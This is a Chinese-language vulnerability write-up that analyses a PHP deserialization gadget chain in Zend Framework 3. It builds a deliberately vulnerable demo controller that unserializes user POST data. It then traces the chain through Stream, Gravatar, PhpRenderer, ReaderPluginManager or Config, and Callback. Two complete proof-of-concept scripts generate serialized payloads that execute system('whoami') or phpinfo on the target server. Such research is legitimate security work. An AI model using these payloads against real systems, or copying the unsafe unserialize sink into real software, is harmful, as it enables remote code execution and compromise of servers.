# 漏洞demo
zend framework3本身没有触发反序列化的点，因此我们需要自己构造一个漏洞demo，用作poc的验证。首先用composer安装
```
composer create-project zendframework/skeleton-application
```
将`module/Application/src/Controller/IndexController.php`改成
```php
class IndexController extends AbstractActionController
{
    public function indexAction()
    {
        $data = $this->getRequest()->getPost('hello');
        unserialize(base64_decode($data));
        return new ViewModel();
    }
}
```

# 漏洞分析

## __destruct
在zendframework3核心包中只有三个`__destruct`入口，其中两个都很简单，只有`vendor/zendframework/zend-http/src/Response/Stream.php`中的`Zend\Http\Response\Stream`类有利用的可能。其析构函数如下


`$this->cleanup`和`$this->streamName`，`unlink`函数的第一个参数为`String`类型，所以可以在啊`$this->streamName`传入类的实例，可以触发`__toString`。

## __toString
有`__toString`方法的类很多，我看中了`vendor/zendframework/zend-view/src/Helper/Gravatar.php`中的`Zend\View\Helper\Gravatar`



跟进到`$this->htmlAttribs()`


```php
$key = $escaper($key);
```
看到rce的希望。回到`Gravatar`，`$this->getAttributes()`可控
```php
public function getAttributes()
{
    return $this->attributes;
}
```

现在只需要构造能顺利执行到rce语句的类，但是
```php
$escaper        = $this->getView()->plugin('escapehtml');
$escapeHtmlAttr = $this->getView()->plugin('escapehtmlattr');
```
这两句带来了一些麻烦。`$this->getView()`可控
```
public function getView()
{
    return $this->view;
}
```
这里可以触发`__invoke`，但是我选择直接找有`plugin()`方法的类。

## 疏通
`vendor/zendframework/zend-view/src/Renderer/PhpRenderer.php`中的`Zend\View\Renderer\PhpRenderer`就是我们要找的。


由于`$this->__helpers`可控，所以`$this->getHelperPluginManager()`也可控，
接下来有两种方法，最终目的都是让`get()`返回我们要的字符串
### Zend\ServiceManager\ReaderPluginManager
`get()`方法在`vendor/zendframework/zend-servicemanager/src/AbstractPluginManager.php`的`Zend\ServiceManager\AbstractPluginManager`中定义，这里我随便选取了子类`Zend\Config\ReaderPluginManager`



`$name`参数为不可控的`escapehtml`和`escapehtmlattr`。


`has()`可以控制输出使`$found`为`true`


`parent::get()`同样可控


`$this->validate()`主要是个`instanceof`的判断，这就限制死了`$key = $escaper($key)`中的`$escaper`必须是个类，又回到了寻找`__invoke()`。

#### __invoke
`vendor/zendframework/zend-validator/src/AbstractValidator.php`中的`Zend\Validator\AbstractValidator`可以利用
```php
public function __invoke($value)
{
    return $this->isValid($value);
}
```
我找到了一个可以利用的子类`Zend\Validator\Callback`


可以看到第139行有`call_user_func_array`，`$callback`来自
```php
public function getCallback()
{
    return $this->options['callback'];
}
```
而`args`来自`$args = [$value];`，也就是函数的第一个参数，即`htmlAttribs()`中的`$key`，所有参数可控，可以rce，最终调用栈如下


#### poc
要注意zend framework3采用了自动加载类的方式，会自动包含我们需要的类
```php
<?php

namespace Zend\Http\Response {
    class Stream
    {
        protected $cleanup = true;
        protected $streamName;

        public function __construct($streamName)
        {
            $this->streamName = $streamName;
        }
    }
}

namespace Zend\View\Helper{
    class Gravatar{
        protected $view;
//        protected $attributes = ["whoami"=>'a'];
        protected $attributes = [1=>'a'];
        public function __construct($view)
        {
            $this->view=$view;
        }
    }
}

namespace Zend\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        public function __construct($__helpers)
        {
            $this->__helpers = $__helpers;
        }
    }
}
namespace Zend\Config{
    class ReaderPluginManager{
        protected $services;
        protected $instanceOf ="Zend\Validator\Callback";
        public function __construct($services){
            $this->services = ["escapehtml"=>$services,"escapehtmlattr"=>$services];
        }
    }
}
namespace Zend\Validator{
    class Callback{
        protected $options = [
            'callback'         => 'phpinfo',
            'callbackOptions'  => []
        ];
    }
}

namespace {
    $e = new Zend\Validator\Callback();
    $d = new Zend\Config\ReaderPluginManager($e);
    $c = new Zend\View\Renderer\PhpRenderer($d);
    $b = new Zend\View\Helper\Gravatar($c);
    $a = new Zend\Http\Response\Stream($b);
    echo base64_encode(serialize($a));
}
```

#### 结果


### Zend\Config\Config
另一种方法是寻找更方便的有`get()`的方法，我找到了`Zend\Config\Config`


可以直接返回我们想要的数据，在`$key = $escaper($key)`rce
调用栈如下

#### poc
```php
<?php

namespace Zend\Http\Response {
    class Stream
    {
        protected $cleanup = true;
        protected $streamName;

        public function __construct($streamName)
        {
            $this->streamName = $streamName;
        }
    }
}

namespace Zend\View\Helper{
    class Gravatar{
        protected $view;
//        protected $attributes = ["whoami"=>'a'];
        protected $attributes = ['whoami'=>1];
        public function __construct($view)
        {
            $this->view=$view;
        }
    }
}

namespace Zend\View\Renderer{
    class PhpRenderer{
        private $__helpers;
        public function __construct($__helpers)
        {
            $this->__helpers = $__helpers;
        }
    }
}

namespace Zend\Config{
    class Config{
        protected $data = [
            "escapehtml"=>'system',
            "escapehtmlattr"=>'phpinfo'
        ];
    }
}

namespace {
    $d = new Zend\Config\Config();
    $c = new Zend\View\Renderer\PhpRenderer($d);
    $b = new Zend\View\Helper\Gravatar($c);
    $a = new Zend\Http\Response\Stream($b);
    echo base64_encode(serialize($a));
}
```

#### 结果
